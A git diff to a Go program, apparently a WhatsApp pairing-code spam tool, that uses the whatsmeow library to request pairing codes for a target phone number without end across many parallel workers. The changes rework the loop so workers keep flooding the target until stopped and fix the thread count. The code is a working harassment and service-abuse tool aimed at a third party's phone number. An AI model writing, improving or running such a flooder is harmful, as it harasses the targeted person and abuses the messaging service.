@@ -23,7 +23,7 @@ var asciiArt = `
        \/        \/               \/                 \/|__|       \/      \/ 
 `
 
-func SentCode(target string, done chan bool, wg *sync.WaitGroup) {
+func SentCode(target string, done <-chan bool, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	container, err := sqlstore.New("sqlite3", "file:wapairspam.db?_foreign_keys=on", nil)
@@ -31,30 +31,35 @@ func SentCode(target string, done chan bool, wg *sync.WaitGroup) {
 		panic(err)
 	}
 
-	for range done {
-		deviceStore, err := container.GetFirstDevice()
-		if err != nil {
-			panic(err)
-		}
-
-		clientLog := waLog.Stdout("Client", "INFO", true)
-		client := whatsmeow.NewClient(deviceStore, clientLog)
-
-		err = client.Connect()
-		if err != nil {
-			color.Red(err.Error())
+	for {
+		select {
+		case <-done:
 			return
+		default:
+			deviceStore, err := container.GetFirstDevice()
+			if err != nil {
+				panic(err)
+			}
+
+			clientLog := waLog.Stdout("Client", "INFO", true)
+			client := whatsmeow.NewClient(deviceStore, clientLog)
+
+			err = client.Connect()
+			if err != nil {
+				color.Red(err.Error())
+				return
+			}
+
+			code, err := client.PairPhone(target, true, whatsmeow.PairClientChrome, "Chrome (Linux)")
+			if err != nil {
+				color.Red(err.Error())
+				continue
+			}
+
+			color.Green(fmt.Sprintf("Sent to %v Code: %v", target, code))
+
+			client.Disconnect()
 		}
-
-		code, err := client.PairPhone(target, true, whatsmeow.PairClientChrome, "Chrome (Linux)")
-		if err != nil {
-			color.Red(err.Error())
-			continue
-		}
-
-		color.Green(fmt.Sprintf("Sent to %v Code: %v", target, code))
-
-		client.Disconnect()
 	}
 }
 
@@ -64,13 +69,16 @@ func main() {
 	var target string
 	var workers int
 	var wg sync.WaitGroup
+
 	done := make(chan bool)
+	defer close(done)
 
 	// Flags
 	flag.StringVar(&target, "target", "", "Target number with country code and DDD")
 	flag.IntVar(&workers, "threads", runtime.NumCPU(), "Num threads (optional)")
 	flag.Parse()
 
+	// Param check
 	if strings.TrimSpace(target) == "" {
 		flag.Usage()
 		return
@@ -78,16 +86,10 @@ func main() {
 
 	fmt.Printf("Using %d Workers.\n", workers)
 
-	for i := 0; i <= workers; i++ {
+	for i := 0; i < workers; i++ {
 		wg.Add(1)
 		go SentCode(target, done, &wg)
 	}
-
-	for {
-		done <- true
-	}
-
-	close(done)
 
 	wg.Wait()
 }
